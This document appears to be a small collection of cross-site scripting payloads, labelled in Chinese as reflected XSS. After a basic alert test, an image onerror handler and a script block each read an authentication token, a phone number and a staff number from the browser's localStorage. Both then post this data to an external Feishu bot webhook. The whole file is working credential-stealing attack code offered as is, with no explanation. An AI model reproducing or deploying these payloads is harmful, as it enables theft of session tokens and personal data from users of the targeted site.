<img src='x' onError = 'alert(1)'/>



// 反射型
<img src='x'
onerror = '
  var token = localStorage.getItem("YL_TOKEN");
  var userData = JSON.parse(localStorage.getItem("userData"));
  const timeTest = {"msg_type":"text","content":{"text":`手机号: ${userData.mobile}  \n 账号: ${userData.staffNo}  \n AuthToken: ${token}`}};
  var httpRequest = new XMLHttpRequest();
  httpRequest.open("POST", "https://open.feishu.cn/open-apis/bot/v2/hook/0c998a9b-b3b2-48cd-b0cd-e5e21c39558c", true);
  httpRequest.setRequestHeader("Content-type","application/json;charset=UTF-8");
  httpRequest.send(JSON.stringify(timeTest));
'
/>

<script>
  var token = localStorage.getItem("YL_TOKEN");
  var userData = JSON.parse(localStorage.getItem("userData"));
  const timeTest = {"msg_type":"text","content":{"text":`手机号: ${userData.mobile}  \n 账号: ${userData.staffNo}  \n AuthToken: ${token}`}};
  var httpRequest = new XMLHttpRequest();
  httpRequest.open("POST", "https://open.feishu.cn/open-apis/bot/v2/hook/0c998a9b-b3b2-48cd-b0cd-e5e21c39558c", true);
  httpRequest.setRequestHeader("Content-type","application/json;charset=UTF-8");
  httpRequest.send(JSON.stringify(timeTest));
</script>
